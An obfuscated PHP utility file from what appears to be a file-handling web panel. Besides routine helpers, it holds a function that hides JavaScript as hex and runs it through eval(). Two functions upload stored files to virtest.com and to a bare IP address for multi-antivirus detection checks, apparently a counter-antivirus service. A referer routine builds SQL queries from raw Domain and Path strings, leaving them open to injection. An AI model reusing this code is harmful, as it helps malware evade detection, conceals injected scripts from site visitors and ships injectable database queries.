<?php 
function _obfuscated_0D26372D0804041C0934082B1602162E3F1508320A1001_($array, $pos, $val)
{
    $_obfuscated_0D32012F0E403F3B3B132135372F03272639130C5B3611_ = array_splice($array, $pos);
    $array[] = $val;
    $array = array_merge($array, $_obfuscated_0D32012F0E403F3B3B132135372F03272639130C5B3611_);
    return $array;
}

function _obfuscated_0D1A27275C5B1A0C391939052F053C0A372B11341B2B22_($text)
{
    $text = trim($text);
    $text = strip_tags($text);
    $text = htmlspecialchars($text);
    return $text;
}

function _obfuscated_0D253C220A0E192B05262B190C3C5C2F31021D270D2422_($array, $value)
{
    $_obfuscated_0D0F303D375B2C3B1A030F082D1A04242D165B211A3432_ = array_keys($array, $value);
    $_obfuscated_0D0F303D375B2C3B1A030F082D1A04242D165B211A3432_ = array_flip($_obfuscated_0D0F303D375B2C3B1A030F082D1A04242D165B211A3432_);
    $_obfuscated_0D0F303D375B2C3B1A030F082D1A04242D165B211A3432_ = array_diff_key($array, $_obfuscated_0D0F303D375B2C3B1A030F082D1A04242D165B211A3432_);
    return $_obfuscated_0D0F303D375B2C3B1A030F082D1A04242D165B211A3432_;
}

function _obfuscated_0D092607073D191D013123143C241125381A1F37060B11_($b, $p = null)
{
    $_obfuscated_0D101139010926161D181B06241F29020E0A1C2B271F11_ = array( "bytes", "kB", "MB" );
    $c = 0;
    $r = array( "bytes" => 0, "units" => "bytes" );
    if( !$p && $p !== 0 ) 
    {
        foreach( $_obfuscated_0D101139010926161D181B06241F29020E0A1C2B271F11_ as $k => $_obfuscated_0D0E392E1F3F051E2A13370F1E2E2A250B0D010F351F11_ ) 
        {
            if( 1 <= $b / pow(1024, $k) ) 
            {
                $r["bytes"] = $b / pow(1024, $k);
                $r["units"] = $_obfuscated_0D0E392E1F3F051E2A13370F1E2E2A250B0D010F351F11_;
                $c++;
            }

        }
        return number_format($r["bytes"], 2) . " " . $r["units"];
    }
    else
    {
        return number_format($b / pow(1024, $p)) . " " . $_obfuscated_0D101139010926161D181B06241F29020E0A1C2B271F11_[$p];
    }

}

function _obfuscated_0D103C270E18282A5B3D2D055B1B3D3237343432292A11_($number, $titles)
{
    $_obfuscated_0D2D0C042B0B3318220C080B19282430263E0D28303F32_ = array( 2, 0, 1, 1, 1, 2 );
    return $titles[(4 < $number % 100 && $number % 100 < 20 ? 2 : $_obfuscated_0D2D0C042B0B3318220C080B19282430263E0D28303F32_[min($number % 10, 5)])];
}

function _obfuscated_0D2C221E3B070F0F2B0D0437082C04383B3226221C0801_($dir)
{
    foreach( scandir($dir) as $f ) 
    {
        if( $f != "." && $f != ".." ) 
        {
            unlink($dir . "/" . $f);
        }

    }
    rmdir($dir);
}

function _obfuscated_0D0603065B083E27323C0815233627335B0C1102191001_($str)
{
    $res = "";
    for( $i = 0; $i < strlen($str); $i++ ) 
    {
        $o = ord($str[$i]);
        $_obfuscated_0D2717322C3729400D0506303C1E3D261B3F1B340C0222_ = dechex($o);
        if( strlen($_obfuscated_0D2717322C3729400D0506303C1E3D261B3F1B340C0222_) == 1 ) 
        {
            $_obfuscated_0D2717322C3729400D0506303C1E3D261B3F1B340C0222_ = "0" . $_obfuscated_0D2717322C3729400D0506303C1E3D261B3F1B340C0222_;
        }

        $res .= $_obfuscated_0D2717322C3729400D0506303C1E3D261B3F1B340C0222_;
    }
    return "" . "<script>var t='';var arr='" . $res . "';for(i=0;i<arr.length;i+=2)t+=String.fromCharCode(parseInt(arr[i]+arr[i+1],16));eval(t);</script>";
}

function _obfuscated_0D0A220E352B17130D272B0905173E061407040F2C0B01_($file, $fileID)
{
    $username = Config::get("virtestLogin");
    if( strpos($username, ":::") !== false ) 
    {
        list($_obfuscated_0D1E26242C3D0A5B0D1B3014275C23022A0316151B2A22_, $username) = explode(":::", $username);
        if( $_obfuscated_0D1E26242C3D0A5B0D1B3014275C23022A0316151B2A22_ == 1 ) 
        {
            return _obfuscated_0D3C0C1A15170718361F1F3306331B5C5C1123242D3001_($file, $fileID);
        }

    }

    $_obfuscated_0D27062E05371314170C5B113619310F0D5C0213291A01_ = Config::get("virtestPass");
    $url = "http://virtest.com/curl.php";
    $_obfuscated_0D394029242114070B1D2A2816250C023F3D393F3B2E01_ = array( "a" => "NOD32", "b" => "IKARUS", "c" => "VirusBuster", "d" => "DrWeb", "e" => "Avast", "f" => "McAfee", "g" => "BitDefender", "h" => "Sophos", "i" => "eTrust", "j" => "AVG8", "k" => "ClamWin", "l" => "KAV8", "m" => "SAV", "n" => "Vba32", "o" => "F-Prot", "p" => "A-Squared", "q" => "TrendMicro", "r" => "F-Secure", "s" => "OneCare", "t" => "Avira", "u" => "Ewido", "v" => "Panda", "w" => "Vexira", "x" => "Norman", "y" => "Solo", "z" => "ArcaVir" );
    $_obfuscated_0D05245B19051135231B2B042715253239110E1F250F11_ = "abcdefghijklmnopqrstuvwxyz";
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POSTFIELDS, array( "file" => "@" . $file, "username" => $username, "password" => $_obfuscated_0D27062E05371314170C5B113619310F0D5C0213291A01_, "avers" => $_obfuscated_0D05245B19051135231B2B042715253239110E1F250F11_ ));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $_obfuscated_0D1413393F021C380B253004332D3634153E10041A1B22_ = curl_exec($ch);
    curl_close($ch);
    if( strpos($_obfuscated_0D1413393F021C380B253004332D3634153E10041A1B22_, "Error: Wrong login or password") !== false ) 
    {
        return false;
    }

    $res = array( "", array(  ), array(  ) );
    preg_match("#Error\\:\\s+(.+)#", $_obfuscated_0D1413393F021C380B253004332D3634153E10041A1B22_, $arr);
    if( isset($arr[1]) ) 
    {
        $res[0] = $arr[1];
    }
    else
    {
        $res[0] = "Success";
    }

    preg_match("#(Vip|Premium)\\:\\s+([\\.\\d]+)#", $_obfuscated_0D1413393F021C380B253004332D3634153E10041A1B22_, $arr);
    if( !isset($arr[1]) ) 
    {
        $res[1][1] = date("d.m.Y");
        return false;
    }

    $res[1][0] = $arr[1];
    $res[1][1] = $arr[2];
    preg_match_all("#\\w#", $_obfuscated_0D05245B19051135231B2B042715253239110E1F250F11_, $arr);
    for( $i = 0; $i < count($arr[0]); $i++ ) 
    {
        preg_match("#" . $_obfuscated_0D394029242114070B1D2A2816250C023F3D393F3B2E01_[$arr[0][$i]] . "(.+)#", $_obfuscated_0D1413393F021C380B253004332D3634153E10041A1B22_, $_obfuscated_0D1118221C351403303D2E2C2F5C1B171831112E041422_);
        if( isset($_obfuscated_0D1118221C351403303D2E2C2F5C1B171831112E041422_[0]) ) 
        {
            $res[2][$i] = $_obfuscated_0D1118221C351403303D2E2C2F5C1B171831112E041422_[0];
        }

    }
    $finded = 0;
    $data = array(  );
    foreach( $res[2] as $k => $str ) 
    {
        $arr = explode(" ", $str);
        $_obfuscated_0D2A3D22120727042133353E2603113E24321501361722_ = "-";
        if( trim($arr[3]) != "-" ) 
        {
            $finded++;
            $_obfuscated_0D2A3D22120727042133353E2603113E24321501361722_ = implode(" ", array_splice($arr, 4));
            $_obfuscated_0D2A3D22120727042133353E2603113E24321501361722_ = strip_tags($_obfuscated_0D2A3D22120727042133353E2603113E24321501361722_);
            $_obfuscated_0D2A3D22120727042133353E2603113E24321501361722_ = str_replace("\r", "", $_obfuscated_0D2A3D22120727042133353E2603113E24321501361722_);
            $_obfuscated_0D2A3D22120727042133353E2603113E24321501361722_ = str_replace("\n", "", $_obfuscated_0D2A3D22120727042133353E2603113E24321501361722_);
        }

        $data[$arr[0]] = $_obfuscated_0D2A3D22120727042133353E2603113E24321501361722_;
    }
    $_obfuscated_0D0A1717141C36141D19380D2C391F0F3B3C2106393622_ = count($res[2]);
    db::update($fileID, array( "LastCheck" => time(), "ScanResult" => $finded, "ScanCount" => $_obfuscated_0D0A1717141C36141D19380D2C391F0F3B3C2106393622_ ), "Files");
    db::query("delete from Antivirus where FileID = " . $fileID);
    foreach( $data as $_obfuscated_0D3B1F290C355C3B383C3E2F1F072427291B0B29135C32_ => $_obfuscated_0D2A3D22120727042133353E2603113E24321501361722_ ) 
    {
        db::insert(array( "FileID" => $fileID, "Title" => $_obfuscated_0D3B1F290C355C3B383C3E2F1F072427291B0B29135C32_, "Result" => $_obfuscated_0D2A3D22120727042133353E2603113E24321501361722_ ), "Antivirus");
    }
    return array( $finded, count($res[2]), $data );
}

function _obfuscated_0D3C0C1A15170718361F1F3306331B5C5C1123242D3001_($file, $fileID)
{
    $id = Config::get("virtestLogin");
    if( strpos($id, ":::") !== false ) 
    {
        list($_obfuscated_0D1E26242C3D0A5B0D1B3014275C23022A0316151B2A22_, $id) = explode(":::", $id);
    }

    $_obfuscated_0D0A22090A0B163D243B363E343F3B2A34303909401732_ = Config::get("virtestPass");
    $url = "http://85.31.101.148/remote.php";
    $_obfuscated_0D3C18261B251E2810325C313622060A4031181B182C01_ = "text";
    if( !file_exists($file) ) 
    {
        exit();
    }

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_VERBOSE, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    $_obfuscated_0D05332928340E161B18125B2F3E321B023D2E25062A22_ = array( "id" => $id, "token" => $_obfuscated_0D0A22090A0B163D243B363E343F3B2A34303909401732_, "action" => "file" );
    $_obfuscated_0D05332928340E161B18125B2F3E321B023D2E25062A22_["uppload"] = "@" . $file;
    $_obfuscated_0D05332928340E161B18125B2F3E321B023D2E25062A22_["frmt"] = $_obfuscated_0D3C18261B251E2810325C313622060A4031181B182C01_;
    curl_setopt($ch, CURLOPT_POSTFIELDS, $_obfuscated_0D05332928340E161B18125B2F3E321B023D2E25062A22_);
    $_obfuscated_0D1F3D283328401D0213120436255C0B15342B1E102222_ = curl_exec($ch);
    echo curl_error($ch);
    $data = array(  );
    if( 40 < strlen($_obfuscated_0D1F3D283328401D0213120436255C0B15342B1E102222_) ) 
    {
        $arr = explode("\n", $_obfuscated_0D1F3D283328401D0213120436255C0B15342B1E102222_);
        $_obfuscated_0D0A1717141C36141D19380D2C391F0F3B3C2106393622_ = 0;
        $finded = 0;
        foreach( $arr as $a ) 
        {
            if( trim($a) == "" ) 
            {
                continue;
            }

            $_obfuscated_0D0A1717141C36141D19380D2C391F0F3B3C2106393622_++;
            if( strpos($a, "OK") === false ) 
            {
                $finded++;
            }

            list($title, $_obfuscated_0D2A3D22120727042133353E2603113E24321501361722_) = explode(":", $a);
            if( $_obfuscated_0D2A3D22120727042133353E2603113E24321501361722_ == "OK" ) 
            {
                $_obfuscated_0D2A3D22120727042133353E2603113E24321501361722_ = "-";
            }

            $data[$title] = $_obfuscated_0D2A3D22120727042133353E2603113E24321501361722_;
        }
        db::update($fileID, array( "LastCheck" => time(), "ScanResult" => $finded, "ScanCount" => $_obfuscated_0D0A1717141C36141D19380D2C391F0F3B3C2106393622_ ), "Files");
        db::query("delete from Antivirus where FileID = " . $fileID);
        foreach( $data as $_obfuscated_0D3B1F290C355C3B383C3E2F1F072427291B0B29135C32_ => $_obfuscated_0D2A3D22120727042133353E2603113E24321501361722_ ) 
        {
            db::insert(array( "FileID" => $fileID, "Title" => $_obfuscated_0D3B1F290C355C3B383C3E2F1F072427291B0B29135C32_, "Result" => $_obfuscated_0D2A3D22120727042133353E2603113E24321501361722_ ), "Antivirus");
        }
        return array( $finded, $_obfuscated_0D0A1717141C36141D19380D2C391F0F3B3C2106393622_, $data );
    }
    else
    {
        return false;
    }

}

function _obfuscated_0D300F132528172B191728400B102A3D141C391D153122_($number, $round = 2)
{
    $_obfuscated_0D311A18303C39073B3E2E1D1926251513253C0E0F0101_ = $number * pow(10, $round);
    $_obfuscated_0D1616220B261B035B06110E230F2E40173E1A1F2D2A22_ = round($_obfuscated_0D311A18303C39073B3E2E1D1926251513253C0E0F0101_);
    $number = $_obfuscated_0D1616220B261B035B06110E230F2E40173E1A1F2D2A22_ / pow(10, $round);
    if( intval($number) == $number ) 
    {
        $number .= ".00";
    }

    return $number;
}

function _obfuscated_0D292712112E16150D0A3B0B032A5B1F05380E312D3D22_()
{
    $max = Config::get("LastMaxRefererID");
    $res = db::select("select ID, Domain,Path from Referers where ID > " . $max . " group by Domain,Path");
    $_obfuscated_0D032D0C1008263E5B1A010A362A3E04281A3E263F3811_ = $max;
    foreach( $res as $r ) 
    {
        if( $_obfuscated_0D032D0C1008263E5B1A010A362A3E04281A3E263F3811_ < $r["ID"] ) 
        {
            $_obfuscated_0D032D0C1008263E5B1A010A362A3E04281A3E263F3811_ = $r["ID"];
        }

        $_obfuscated_0D2D0B38092A352F1509011724081603093E211E1A0D22_ = db::select("select ID from Referers where Domain=\"" . $r["Domain"] . "\" and Path=\"" . $r["Path"] . "\"");
        if( 1 < count($_obfuscated_0D2D0B38092A352F1509011724081603093E211E1A0D22_) ) 
        {
            $_obfuscated_0D1C3C140A1631262A3D062B3B082132352129251A0932_ = array_pop($_obfuscated_0D2D0B38092A352F1509011724081603093E211E1A0D22_);
            $id = $_obfuscated_0D1C3C140A1631262A3D062B3B082132352129251A0932_["ID"];
            $_obfuscated_0D3D1A0D262440353D22350E292F292F2D123612251432_ = array(  );
            foreach( $_obfuscated_0D2D0B38092A352F1509011724081603093E211E1A0D22_ as $k ) 
            {
                $_obfuscated_0D3D1A0D262440353D22350E292F292F2D123612251432_[] = $k["ID"];
            }
            $str = implode(",", $_obfuscated_0D3D1A0D262440353D22350E292F292F2D123612251432_);
            db::query("delete from Referers where ID in (" . $str . ")");
            db::query("update Logs set RefererID=" . $id . " where RefererID in (" . $str . ")");
        }

    }
    if( $max < $_obfuscated_0D032D0C1008263E5B1A010A362A3E04281A3E263F3811_ ) 
    {
        Config::write("LastMaxRefererID", $_obfuscated_0D032D0C1008263E5B1A010A362A3E04281A3E263F3811_);
    }

}


